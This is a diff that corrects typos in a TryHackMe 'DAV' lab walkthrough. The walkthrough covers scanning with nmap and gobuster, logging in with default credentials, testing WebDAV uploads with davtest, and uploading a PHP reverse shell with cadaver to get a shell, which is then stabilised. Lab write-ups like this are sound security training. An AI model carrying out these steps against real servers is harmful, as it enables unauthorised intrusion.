@@ -3,10 +3,10 @@
 ======================================================================================================================================================
 
 This is a walkthrough of the DAV room from TryHackMe — rated Easy. I’m documenting what I found, the steps I took, and what I learned along the way, 
-in case if you see it will certainly help solving the lab. ah and this is on ejpt cert exam too .
+in case it helps someone else solve the lab. by the way this technique appears on the eJPT.
 
 -----------------------------
-🎯 Target -ip- 10.48.147.10
+🎯 Target -ip- 10.48.147.108
 ----------------------------
 lets start:->
 
@@ -16,10 +16,10 @@ i started start with nmap.
 _________________________________
 >$ nmap -sC -sV -p- 10.48.147.108
 _________________________________
-As result, we can see that the port 80 is open, which is running an Appache with a default page
+As result, we can see that the port 80 is open, which is running an Apache with a default page
 
-i put the IP in my browser search bar it opened Appache2 default page.
-i looked for robots.txt just for formality and it was not accesible .Then i used gobuster for directory bruteforce.
+i put the IP in my browser search bar it opened Apache2 default page.
+i looked for robots.txt just for formality and it was not accessible .Then i used gobuster for directory bruteforce.
 
 >$ gobuster dir -u http://10.48.147.108 -w /usr/share/wordlists/dirb/common.txt
 
@@ -33,8 +33,8 @@ _________________
 |_______________|
 you too should check out online there are other default credentials available (back to the topic)
 
-after i login succesfully i found password directory where hashes were contain but ignore it they are not usefull in this lab 
-but what important was /webdav directry and .dav because it tells me use davtest .
+after i login successfully i found password directory where hashes were contained but ignore it they are not useful in this lab 
+but what important was /webdav directory and .dav because it tells me use davtest .
 
 
 ***********
@@ -48,7 +48,7 @@ Purpose: quickly confirm whether a WebDAV misconfiguration is exploitable before
 >$ davtest -url http://10.48.147.108/webdav -auth username:password
 ______________________________________________________________________
 Output showed PHP uploads were permitted — meaning we could upload a PHP reverse shell and have the server execute it.
-so what we will do is cp /usr/share/webshells/php-reverse-shell . in your current working directry then we will use cadaver. Make sure to change ip and port .
+so what we will do is cp /usr/share/webshells/php-reverse-shell . in your current working directory then we will use cadaver. Make sure to change ip and port .
 
 *********
 cadaver->
@@ -80,7 +80,7 @@ __________________________________________________
 
 The PHP file is executed now go back to our listener, we got a reverse shell.
 
-Stabilized the TTY for a proper interactive shell:(why we did this? because its written there look )
+Stabilized the TTY for a proper interactive shell:
 
 >$ python3 -c 'import pty; pty.spawn("/bin/bash")'
 __________________________________________________
